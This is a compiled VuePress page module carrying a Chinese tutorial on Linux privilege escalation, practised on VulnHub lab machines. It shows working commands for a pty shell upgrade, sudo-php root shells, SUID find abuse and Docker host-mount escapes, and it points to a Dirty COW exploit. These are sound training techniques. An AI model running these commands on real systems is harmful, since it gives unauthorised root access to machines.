import{_ as t}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as r,c as o,a,b as n,d as s,e as i,r as l}from"./app.04d5a320.js";const p={},d=i(`<h2 id="交互式shell" tabindex="-1"><a class="header-anchor" href="#交互式shell" aria-hidden="true">#</a> 交互式Shell</h2><p>su root被禁止登录（获取交互shell）</p><p>拿到 root 密码，端口转发，代理，但防火墙禁止其他人登录 root；</p><p>用原来的低权限 shell，也无法 sudo 切换 root</p><div class="custom-container tip"><p class="custom-container-title">提示</p><p>因为出于安全考虑，linux 要求用户必须从终端设备（tty）中输入密码，而不是标准输入（stdin）</p><p>所以 sudo 在你输入密码的时候本质上是读取了键盘，而不是读取 bash 里面输入的字符</p></div><p>利用Python获取交互shell</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>python <span class="token parameter variable">-c</span> <span class="token string">&#39;import pty;pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
<span class="token function">sudo</span> <span class="token function">su</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="sudo滥用提权" tabindex="-1"><a class="header-anchor" href="#sudo滥用提权" aria-hidden="true">#</a> Sudo滥用提权</h2><h3 id="原理" tabindex="-1"><a class="header-anchor" href="#原理" aria-hidden="true">#</a> 原理</h3><p>/etc/sudoers文件定义可以执行 sudo 的账户、定义某个应用程序用 root 访问、是否需要密码验证</p><h3 id="靶机-me-and-my-girlfriend" tabindex="-1"><a class="header-anchor" href="#靶机-me-and-my-girlfriend" aria-hidden="true">#</a> 靶机-Me-And-My-Girlfriend</h3>`,11),c={href:"https://download.vulnhub.com/meandmygirlfriend/Me-and-My-Girlfriend-1.ova",target:"_blank",rel:"noopener noreferrer"},u=i(`<p>1、信息收集</p><p>2、http头 X-Forwarded-For</p><p>3、注册用户-越权-爆破SSH</p><p>4、Sudo滥用提权 php</p><p>提权步骤：</p><p>1）查看当前用户有sudo权限的程序</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">sudo</span> <span class="token parameter variable">-l</span>

<span class="token comment">#结果如下</span>
Matching Defaults entries <span class="token keyword">for</span> alice on gfriEND:
  env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\\</span>:/usr/local/bin<span class="token punctuation">\\</span>:/usr/sbin<span class="token punctuation">\\</span>:/usr/bin<span class="token punctuation">\\</span>:/sbin<span class="token punctuation">\\</span>:/bin<span class="token punctuation">\\</span>:/snap/bin
User alice may run the following commands on gfriEND:
  <span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/bin/php
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>2）以root权限运行php生成一个交互shell</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token assign-left variable">CMD</span><span class="token operator">=</span><span class="token string">&quot;/bin/sh&quot;</span>
<span class="token function">sudo</span> php <span class="token parameter variable">-r</span> <span class="token string">&quot;system(&#39;<span class="token variable">$CMD</span>&#39;);&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>3）之后查看 /etc/sudoers文件</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>alice  <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/bin/php
<span class="token comment">#可以发现 alice用户可以用root权限无需密码运行 php</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="suid提权" tabindex="-1"><a class="header-anchor" href="#suid提权" aria-hidden="true">#</a> SUID提权</h2>`,12),h={href:"http://wiki.peiqi.tech/wiki/system/Linux/Linux",target:"_blank",rel:"noopener noreferrer"},m={href:"http://wiki.peiqi.tech/wiki/system/Linux/Linux",target:"_blank",rel:"noopener noreferrer"},b=a("h3",{id:"原理-1",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#原理-1","aria-hidden":"true"},"#"),n(" 原理")],-1),v=a("p",null,"SUID 是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行；",-1),k=a("p",null,"ls 查看时有 s 属性才支持 SUID。",-1),g=a("h3",{id:"靶机-dc1",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#靶机-dc1","aria-hidden":"true"},"#"),n(" 靶机-DC1")],-1),f={href:"https://download.vulnhub.com/dc/DC-1.zip",target:"_blank",rel:"noopener noreferrer"},_=i(`<p>1）查找正在系统上运行的所有SUID可执行文件</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>2）SUID-find提权</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#随便新建一个文件，或利用已有文件</span>
<span class="token function">touch</span> abc

<span class="token comment">#以SUID即root权限执行命令</span>
<span class="token function">find</span> abc <span class="token parameter variable">-exec</span> whomai <span class="token punctuation">\\</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="docker提权" tabindex="-1"><a class="header-anchor" href="#docker提权" aria-hidden="true">#</a> Docker提权</h2><h3 id="原理-2" tabindex="-1"><a class="header-anchor" href="#原理-2" aria-hidden="true">#</a> 原理：</h3><p>linux机器上的本地用户信息主要记录在/etc/目录下，比如两个常见文件/etc/passwd和/etc/group两个文件分别记录了用户基本属性与用户分组信息。</p><p>将宿主机上的/etc目录直接映射进容器，从而覆盖了容器内的/etc目录；再加上容器内用户默认是root，拥有超级管理员权限。</p><h3 id="靶机" tabindex="-1"><a class="header-anchor" href="#靶机" aria-hidden="true">#</a> 靶机：</h3>`,9),x={href:"https://download.vulnhub.com/sunset/dusk.7z",target:"_blank",rel:"noopener noreferrer"},y=i(`<p>Sudo滥用提权+Docker提权</p><p>1、先sudo提权到普通用户权限</p><p>2、Docker提权</p><p>1）查看当前用户是否在Docker用户组内 （id）</p><p>2）Dcker提权-映射磁盘</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">docker</span> run <span class="token parameter variable">-it</span> <span class="token parameter variable">--rm</span> <span class="token parameter variable">-v</span> /etc:/etc 容器ID /bin/bash
或
<span class="token function">docker</span> run <span class="token parameter variable">-v</span> /:/mnt <span class="token parameter variable">--rm</span> <span class="token parameter variable">-it</span> alpine <span class="token function">chroot</span> /mnt <span class="token function">sh</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="系统内核漏洞提权" tabindex="-1"><a class="header-anchor" href="#系统内核漏洞提权" aria-hidden="true">#</a> 系统内核漏洞提权</h2><h3 id="靶机-lampiao" tabindex="-1"><a class="header-anchor" href="#靶机-lampiao" aria-hidden="true">#</a> 靶机-Lampiao</h3>`,8),D={href:"https://download.vulnhub.com/lampiao/Lampiao.zip",target:"_blank",rel:"noopener noreferrer"},w=i(`<p>1）系统内核信息收集</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#查看系统版本内核信息</span>
<span class="token function">uname</span> <span class="token parameter variable">-a</span>

<span class="token comment">#centos</span>
hostnamectl 
<span class="token comment">#查看系统版本内核详细信息，推荐这个命令</span>

<span class="token comment">#ubuntu</span>
lsb_release <span class="token parameter variable">-a</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,2),L={href:"https://github.com/offensive-security/exploitdb",target:"_blank",rel:"noopener noreferrer"},C=i(`<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>searchsploit linux <span class="token number">3.10</span> CentOS Linux <span class="token number">7</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,1),S={href:"https://github.com/gbonacini/CVE-2016-5195",target:"_blank",rel:"noopener noreferrer"},E=i(`<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>./dcow <span class="token parameter variable">-s</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>编译好后报错cannot execute binary file: Exec format error，原因是系统版本和g++版本差异造成的，将源码上传到目标系统编译执行，成功执行</p><p>4）脏牛提权原理</p><p>该漏洞的原因是get_user_page内核函数在处理Copy-on-Write(以下使用COW表示)的过程中，</p><p>可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。</p><p>当我们向带有MAP_PRIVATE标记的只读文件映射区域写数据时，会产生一个映射文件的复制(COW)，对此区域的任何修改都不会写回原来的文件，</p><p>如果上述的竞态条件发生，就能成功的写回原来的文件。比如我们修改su或者passwd程序就可以达到root的目的。</p>`,7);function V(q,I){const e=l("ExternalLinkIcon");return r(),o("div",null,[d,a("p",null,[a("a",c,[n("https://download.vulnhub.com/meandmygirlfriend/Me-and-My-Girlfriend-1.ova"),s(e)])]),u,a("p",null,[n("[Linux DirtyPipe权限提升漏洞 CVE-2022-0847]("),a("a",h,[n("http://wiki.peiqi.tech/wiki/system/Linux/Linux"),s(e)]),n(" DirtyPipe权限提升漏洞 CVE-2022-0847.html)")]),a("p",null,[n("[Linux eBPF权限提升漏洞 CVE-2022-23222]("),a("a",m,[n("http://wiki.peiqi.tech/wiki/system/Linux/Linux"),s(e)]),n(" eBPF权限提升漏洞 CVE-2022-23222.html)")]),b,v,k,g,a("p",null,[a("a",f,[n("https://download.vulnhub.com/dc/DC-1.zip"),s(e)])]),_,a("p",null,[a("a",x,[n("https://download.vulnhub.com/sunset/dusk.7z"),s(e)])]),y,a("p",null,[a("a",D,[n("https://download.vulnhub.com/lampiao/Lampiao.zip"),s(e)])]),w,a("p",null,[n("2）使用 "),a("a",L,[n("searchsploit"),s(e)]),n(" 查找相关内核漏洞")]),C,a("p",null,[n("3）脏牛提权 (Dirty COW) "),a("a",S,[n("https://github.com/gbonacini/CVE-2016-5195"),s(e)])]),E])}const N=t(p,[["render",V],["__file","权限提升-Linux.html.vue"]]);export{N as default};
